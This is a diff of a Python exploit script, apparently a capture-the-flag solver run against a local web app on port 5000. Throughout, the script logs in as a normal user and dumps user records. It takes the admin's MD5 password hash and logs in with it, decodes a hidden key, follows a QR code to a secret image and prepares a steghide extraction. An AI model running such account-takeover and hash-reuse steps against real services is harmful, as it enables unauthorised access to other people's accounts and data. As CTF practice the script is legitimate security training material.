@@ -1,5 +1,4 @@
 import sys
-sys.path.append("..")
 import config
 import requests
 import hashlib,json
@@ -7,11 +6,22 @@ from lxml import html
 from lxml import etree
 import os
 import re
-host = config.host;
+import base64
+from bs4 import BeautifulSoup
+import wget
+from pyzbar.pyzbar import decode
+from PIL import Image
+
+sys.path.append("..")
+
+# host = config.host;
+host='127.0.0.1'
+#目前在本地环境测试exp
 url_register = "http://" + host + ":5000/register"
 url_login = "http://" + host + ":5000/login"
 url_index = "http://" + host + ":5000/index"
 
+key=""
 admin_passwd_md5 =""
 session = ""
 username = "kate"
@@ -23,11 +33,10 @@ data = {"username":username,"passwd":passwd}
 #注册：最后写成变量传入用户名密码的方式
 #res = requests.post(url=url_register,data=data)
 
-
 #登陆
 res = requests.post(url=url_login,data=data)
 res = res.json()
-print(res)
+#print(res)
 if( res["status"] == 206):
     session = res["session"]
     print(username, "登陆成功，你的session是：",res["session"])
@@ -52,6 +61,11 @@ if res["status"] == 208:
         if item[1] == "admin":
             print("admin账号的信息：")
             print(item)
+            print("关键key的值")
+            key=item[4]
+            key=base64.b64decode(key[4:])
+            key=str(key,'utf8')
+            print(key)
             #此处是使用彩虹表攻击的暴力过程
             admin_passwd = "passwd123"
             admin_passwd_md5 = item[2]
@@ -64,7 +78,7 @@ username = "admin"
 data = {"username":username,"passwd":admin_passwd_md5,"session":session}
 res = requests.post(url=url_login,data=data)
 res = res.json()
-print(res)
+#print(res)
 if( res["status"] == 206):
     session = res["session"]
     print(username, "登陆成功，你的session是：",res["session"])
@@ -82,7 +96,24 @@ QR_url = "http://"+host+":5000/"+ block[0]
 print("具有隐藏信息的图片是：")
 print(QR_url)
 
-r = requests.get(QR_url)
-with open("QR.png", "wb")as f:
-    f.write(r.content)
+cmd='mkdir pic'
+os.system(cmd)
+wget.download(QR_url,"pic/QR.png")
+qr="pic/QR.png"
+img = Image.open(qr)
+barcodes = decode(img)
+for barcode in barcodes:
+    url = barcode.data.decode("utf-8")
+    #print(url)
 
+res = requests.get(url).text 
+#print(res)
+doc = etree.HTML(res)
+resurl=doc.xpath('//*[@id="content"]/p[1]/img/@data-src')
+#print(resurl[0])
+wget.download(resurl[0],"pic/secret.jpg")
+
+#cmd='steghide extract -sf pic/secret.jpg -p %s'%(key)
+#ans=os.system(cmd)
+#print(ans)
+##print
